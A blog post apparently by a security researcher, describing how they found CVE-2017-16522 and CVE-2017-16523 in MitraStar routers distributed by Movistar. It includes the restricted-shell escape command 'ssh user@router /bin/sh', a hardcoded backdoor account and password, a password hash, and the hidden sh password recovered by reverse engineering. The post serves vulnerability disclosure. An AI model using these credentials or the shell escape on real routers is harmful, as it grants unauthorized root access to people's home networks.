---
layout: post
title: MitraStar routers Remote Privilege Escalation
---

In this post I will describe how I discovered the vulnerabilities [CVE-2017-16522](https://nvd.nist.gov/vuln/detail/CVE-2017-16522) and [CVE-2017-16523](https://nvd.nist.gov/vuln/detail/CVE-2017-16523). These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with version up to november 2017.

The devices where the research has been made are the MitraStar DSL-100HN-T1 ("*the old*") and the MitraStar GPT-2541GNAC (HGU) ("*the new*").

*The old* with a firmware version ES_113WJY0b16:
<p align="center">
      <img src="/images/router-attack/old.jpg">
</p>

*The new* with a firmware version 1.00(VNJ0)b1:
<p align="center">
      <img src="/images/router-attack/new.jpeg">
</p>

These two vulnerabilities can be considered as only one that elevates privileges remotely on the router avoiding the preseted shell.

#### Getting access to the router

The first thing I did was a port scanning with the tool *nmap* in the old:
```bash
nmap -F <router_ip>
```
With the the following result:
```bash
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    filtered telnet
53/tcp    open     domain
80/tcp    open     http
443/tcp   open     https
8080/tcp  open     http-proxy
49152/tcp open     unknown
```

This router has *ssh* running on the port 22 and with some google searches I found that the default user is *admin* and the password is under the router.
I also discovered months later with reverse engineering that in some routers exist a user call *zyad1234* with password *zyad1234* (Vulnerability CVE-2017-16523).

In my case, with the *admin* user I could get access to the router.

When you log in to the router through *ssh* the router provides you a limitated shell with some commands that allow you to modify some parameters such as the DHCP, lan parameters, and install updates and configurations. All these functions can be executed through the router configuration website at 192.168.1.1.

```bash
$ ssh 1234@192.168.1.3
1234@192.168.1.3's password: 
 >ls
Can't find command: [ls]. Type '?' for usage
 >?
Valid commands are:
?               exit            save            sys             restoredefault
wan             lan             igmp            wlan            nat
routing         
 >sys
Missing subcommand. Valid subcommands are:
process         userPasswd      passwd          telnetd         state
swversion       swupdate        updatecfg       backupcfg       dumpcfg
sysdiagd        firewall        upnp            reboot          exitOnIdle
ppp             
 >sys swversion
V1.13(WJY.0)b15
 >
```

#### Looking for some bugs

The first thing I tried was introducing a long string to produce a buffer overflow or some crashes:
```bash
 >aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Cant find command: [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]. Type '?' for usage
 >
```

With the impossibility of finding a buffer overflow I accidentally introduced the *sh* command:
```bash
 >sh
Password:Password incorrect !
 >
```

This output means that there is a *sh* command that requires a password and it should give you access to a more privilege shell but the password is unknown.

#### Using other versions

After days without any result I decided to use the other router (*the new*). This router has a differente software version with the same pseudo-shell but with more commands such as *cat* (used to check if a specific file exists) or the *ps* command:
```bash
 > cat /etc/passwd
1234:Mt3cwxDUQQ7AY:0:0:Administrator:/:/bin/sh
 > ps
  PID USER       VSZ STAT COMMAND
    1 1234      1700 S    init
    2 1234         0 SW   [kthreadd]
    3 1234         0 SW   [ksoftirqd/0]
    5 1234         0 SW   [kworker/u:0]
    6 1234         0 SW   [migration/0]
    7 1234         0 SW   [migration/1]
    9 1234         0 SW   [ksoftirqd/1]
   11 1234         0 SW<  [khelper]
   54 1234         0 SW   [sync_supers]
   56 1234         0 SW   [bdi-default]
   58 1234         0 SW<  [kblockd]
   75 1234         0 SW   [skbFreeTask]
   92 1234         0 SWN  [kswapd0]
   93 1234         0 SW   [fsnotify_mark]
   94 1234         0 SW<  [crypto]
  151 1234         0 SW   [mtdblock0]
  156 1234         0 SW   [mtdblock1]
  161 1234         0 SW   [mtdblock2]
  166 1234         0 SW   [mtdblock3]
  171 1234         0 SW   [mtdblock4]
  176 1234         0 SW   [mtdblock5]
  181 1234         0 SW   [mtdblock6]
  186 1234         0 SW   [mtdblock7]
  191 1234         0 SW   [mtdblock8]
  202 1234         0 SW<  [linkwatch]
  212 1234         0 SW<  [deferwq]
  219 1234         0 SWN  [jffs2_gcd_mtd2]
  220 1234         0 SWN  [jffs2_gcd_mtd6]
  221 1234         0 SWN  [jffs2_gcd_mtd7]
  222 1234         0 SWN  [jffs2_gcd_mtd8]
  229 1234      2532 S <  /bin/mm.exe
  233 1234      2532 S    /bin/mm.exe
  234 1234      2532 S    /bin/mm.exe
  235 1234      2532 S    /bin/mm.exe
  236 1234      2532 S    /bin/mm.exe
  237 1234      8596 S <  /bin/icf.exe
  256 1234         0 DW   [Pon]
  262 1234      8596 S <  /bin/icf.exe
  263 1234      8596 S <  /bin/icf.exe
  275 1234      1692 D    cat /dev/rgs_logger
  449 1234         0 SW   [bcmFlwStatsTask]
  496 1234         0 SW   [bcmsw_rx]
  515 1234         0 SW   [bcmsw]
  525 1234         0 SW   [wfd]
  529 1234         0 SW   [wl0-kthrd]
  623 1234      6248 S    /bin/smd
  626 1234      6884 S    ssk
  641 1234      1444 S    dnsproxy
  644 1234      1420 S    sntp -s hora.ngn.rima-tde.net -t CET-1CEST,M3.5.0/2:
  669 1234      2048 S    dhcpd
  818 1234      3768 S    rastatus6
 1283 1234         0 SW   [kworker/u:2]
 1320 1234      9144 S    rmt_qcsmngr -m 0
 1495 1234      6776 S    mcpd
 1496 1234      8760 S    omcid -m 0 -v 0 start
 1625 1234      9576 S    omcipmd -m 0
 1626 1234       928 S    cpuload
 1627 1234      7896 S    wlmngr -m 0
 1628 1234      8128 S    voiceApp -m 0
 1629 1234      6644 S    rmt_qcsmngr_watchDog -m 0
 1634 1234      6600 S    /bin/sskwatchdog
 1643 1234      7896 S    wlmngr -m 0
 1644 1234      7896 S    wlmngr -m 0
 1668 1234      8128 S    voiceApp -m 0
 1669 1234      8128 S    voiceApp -m 0
 1697 1234      1700 S    -/bin/sh -l -c consoled
 1699 1234      9036 S    consoled
 1706 1234      1404 S    /bin/wlevt
 1709 1234      2532 S <  /bin/mm.exe
 1710 1234      2532 S <  /bin/mm.exe
 1711 1234      2532 S <  /bin/mm.exe
 1712 1234      2532 S <  /bin/mm.exe
 1713 1234      2532 S <  /bin/mm.exe
 1714 1234      2532 S <  /bin/mm.exe
 1715 1234      2532 S <  /bin/mm.exe
 1718 1234      2532 S <  /bin/mm.exe
 1719 1234      2532 S <  /bin/mm.exe
 1720 1234      2532 S    /bin/mm.exe
 1721 1234      8128 S <  voiceApp -m 0
 1722 1234      8128 S <  voiceApp -m 0
 1723 1234      8128 S    voiceApp -m 0
 1845 1234      1628 S    /bin/lld2d br0
 1850 1234      1552 S    /bin/eapd
 1853 1234      1920 S    /bin/nas
 1863 1234      1652 S    /bin/acsd
 1865 1234      2972 S    /bin/wps_monitor
 1936 1234      1020 S    radvd -C /var/radvd.conf
 2101 1234      9144 S    rmt_qcsmngr -m 0
 2102 1234      9144 S    rmt_qcsmngr -m 0
 2103 1234      9144 S    rmt_qcsmngr -m 0
 2104 1234      9144 S    rmt_qcsmngr -m 0
 7349 1234         0 SW   [kworker/1:0]
 7638 1234         0 SW   [kworker/0:2]
 8290 1234         0 SW   [flush-mtd-unmap]
 8565 1234      9300 S    sshd -m 0
 8578 1234      9308 S    sshd -m 0
 8847 1234         0 SW   [kworker/0:0]
 8956 1234         0 SW   [kworker/1:1]
 9455 1234         0 SW   [kworker/1:2]
 9944 1234         0 SW   [kworker/0:1]
10047 1234      1696 S    sh -c ps
10048 1234      1700 R    ps
25183 1234         0 SW   [kworker/1:3]
30628 1234      1696 S    sh -c /bin/sh
30629 1234      1696 S    /bin/sh
30892 1234      9256 R    ./sshd
32030 1234      1696 S    sh -c /bin32031 1234      1696 S    /bin32079 1234      9256 R    ./sshd -m 0
```

After I explored some commands I found the *deviceinfo* command which offers the following possibilities:
```bash
 > deviceinfo
Usage: deviceinfo show serialnumber
   deviceinfo show ploampw
   deviceinfo set serialnumber <value>
   deviceinfo set ploampw <value>
   deviceinfo show datetime
   deviceinfo show cpuload
   deviceinfo show meminfo
   deviceinfo show file <path>
   deviceinfo show interface
   deviceinfo --help
 > 
```

The command *deviceinfo show file /* works as the *ls* command and allows us to list all the files and directories that are in /:
```bash
 > deviceinfo show file /
app          debug        linuxrc      sbin         usrcfg
bin          dev          mnt          sys          var
cfg_upgrade  etc          opt          tmp          vmlinux.lz
data         lib          proc         usr          webs
 > 
```

I was generating the file system tree and looking for some files with information about the *sh* command password but I didn't find anything.

#### The vulnerability
The next day I came back to *the old* to try new things but surprisingly I decided to try something unusual. Instead of connecting to the router with the command *ssh admin@<router_ip>*, I decided to add the path to the *sh* binary (/bin/sh) as second parameter because by default *ssh* execute the command passed as argument.
```bash
ssh 1234@192.168.1.2 <comand>
```

The output was the following:
```bash
$ ssh 1234@192.168.1.3 /bin/sh
1234@192.168.1.3's password: 

					

```

This looked like there was something wrong and I was waiting for connection but I tried to introduce the *ls* command and surprisingly was executed succesfully!
I had access to a privilege shell with a complete root access to the system.

#### Some reverse engineering

I found that the default shell for ssh was a binary call cmdsh in the /bin/ folder.

I still needed the *sh* command password so I decided to bring the binary to my laptop an execute IDA Pro.
The binary was compiled for MIPS architecture and I only needed to find where the string "Password incorrect!" is used to see a condition before, that compare a string with the string "c93vu02jp4z04", the *sh* password.

<p align="center">
      <img src="/images/router-attack/ida.png">
</p>

#### Conclusions

I hope you learned something new and over all enjoyed reading this post as much I did writing it.

If you want more post like this one make it me know thorugh Twitter or buying me a [Ko-Fi](https://ko-fi.com/jolama)

